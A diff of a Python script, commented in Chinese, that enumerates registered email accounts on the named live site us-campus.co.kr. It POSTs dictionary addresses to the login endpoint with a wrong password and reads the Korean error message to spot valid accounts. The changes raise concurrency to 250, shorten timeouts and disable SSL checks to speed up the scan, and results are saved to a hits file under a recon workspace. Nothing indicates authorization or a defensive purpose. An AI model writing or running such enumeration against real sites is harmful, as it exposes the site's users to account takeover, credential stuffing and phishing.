@@ -1,20 +1,17 @@
 #!/usr/bin/env python3
 """
-us-campus.co.kr 高速邮箱枚举
-用法: python3 fast_email_enum.py [--dict 字典路径] [--concurrency 80] [--out 结果.json]
+us-campus.co.kr 高速邮箱枚举 (滑动窗口全速版)
+用法: python3 fast_email_enum.py [--dict 字典] [--concurrency 250] [--limit N]
 """
 import asyncio
 import aiohttp
 import argparse
 import json
 import time
-import sys
 
 BASE = "https://us-campus.co.kr"
 H = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
-
-HIT_LOGIN = "비밀번호가 일치"      # 已注册
-MISS_LOGIN = "이메일 또는 비밀번호"  # 未注册
+HIT_LOGIN = "비밀번호가 일치"
 
 
 async def check(email: str, session: aiohttp.ClientSession, sem: asyncio.Semaphore):
@@ -25,7 +22,7 @@ async def check(email: str, session: aiohttp.ClientSession, sem: asyncio.Semapho
                 data={"email": email, "password": "WrongPass123!"},
                 headers=H,
                 ssl=False,
-                timeout=aiohttp.ClientTimeout(total=15),
+                timeout=aiohttp.ClientTimeout(total=8, connect=3),
             ) as resp:
                 text = await resp.text()
                 if HIT_LOGIN in text:
@@ -35,31 +32,39 @@ async def check(email: str, session: aiohttp.ClientSession, sem: asyncio.Semapho
     return None
 
 
-async def run(emails: list, concurrency: int):
+async def run(emails: list, concurrency: int, report_every: int = 5000):
     sem = asyncio.Semaphore(concurrency)
-    conn = aiohttp.TCPConnector(limit=concurrency, ssl=False)
+    conn = aiohttp.TCPConnector(
+        limit=concurrency + 20,
+        limit_per_host=concurrency + 20,
+        ssl=False,
+        ttl_dns_cache=600,
+        enable_cleanup_closed=True,
+    )
     hits = []
     done = 0
     total = len(emails)
     t0 = time.time()
+    last_report = 0
 
     async with aiohttp.ClientSession(connector=conn) as session:
-        batch = 500
-        for i in range(0, total, batch):
-            chunk = emails[i : i + batch]
-            results = await asyncio.gather(*[check(e, session, sem) for e in chunk])
-            for r in results:
-                if r:
-                    hits.append(r)
-                    print(f"[HIT] {r['email']}", flush=True)
-            done += len(chunk)
-            elapsed = time.time() - t0
-            rate = done / elapsed if elapsed else 0
-            print(
-                f"[进度] {done:,}/{total:,} ({100*done/total:.1f}%) "
-                f"命中={len(hits)} 速度={rate:.0f}/s",
-                flush=True,
-            )
+        tasks = [asyncio.create_task(check(e, session, sem)) for e in emails]
+        for coro in asyncio.as_completed(tasks):
+            r = await coro
+            if r:
+                hits.append(r)
+                print(f"[HIT] {r['email']}", flush=True)
+            done += 1
+            if done - last_report >= report_every or done == total:
+                elapsed = time.time() - t0
+                rate = done / elapsed if elapsed else 0
+                print(
+                    f"[进度] {done:,}/{total:,} ({100*done/total:.1f}%) "
+                    f"命中={len(hits)} 速度={rate:.0f}/s",
+                    flush=True,
+                )
+                last_report = done
+
     return hits, time.time() - t0
 
 
@@ -78,15 +83,14 @@ def main():
     parser.add_argument(
         "--dict",
         default="/workspace/us-campus-recon/dict/emails_kr_large.txt",
-        help="邮箱字典路径",
     )
-    parser.add_argument("--concurrency", type=int, default=80, help="并发数(推荐50-80)")
+    parser.add_argument("--concurrency", type=int, default=250, help="并发(推荐200-250)")
     parser.add_argument(
         "--out",
         default="/workspace/us-campus-recon/dict/enum_hits.json",
-        help="命中结果输出",
     )
-    parser.add_argument("--limit", type=int, default=0, help="只扫前N条(测试用)")
+    parser.add_argument("--limit", type=int, default=0)
+    parser.add_argument("--report-every", type=int, default=5000)
     args = parser.parse_args()
 
     emails = load_dict(args.dict)
@@ -94,10 +98,10 @@ def main():
         emails = emails[: args.limit]
     print(f"字典: {args.dict}")
     print(f"邮箱数: {len(emails):,}  并发: {args.concurrency}")
-    print("接口: POST /login/login (单接口最快)")
+    print("接口: POST /login/login | 模式: 滑动窗口全速")
     print("-" * 50)
 
-    hits, elapsed = asyncio.run(run(emails, args.concurrency))
+    hits, elapsed = asyncio.run(run(emails, args.concurrency, args.report_every))
 
     result = {
         "target": BASE,
@@ -112,10 +116,9 @@ def main():
         json.dump(result, f, ensure_ascii=False, indent=2)
 
     print("-" * 50)
-    print(f"完成: 扫描 {len(emails):,}  命中 {len(hits)}  耗时 {elapsed:.0f}s")
+    print(f"完成: 扫描 {len(emails):,}  命中 {len(hits)}  耗时 {elapsed:.0f}s  速度 {result['rate_per_sec']}/s")
     print(f"结果: {args.out}")
     if hits:
-        print("命中列表:")
         for h in hits:
             print(f"  {h['email']}")
 
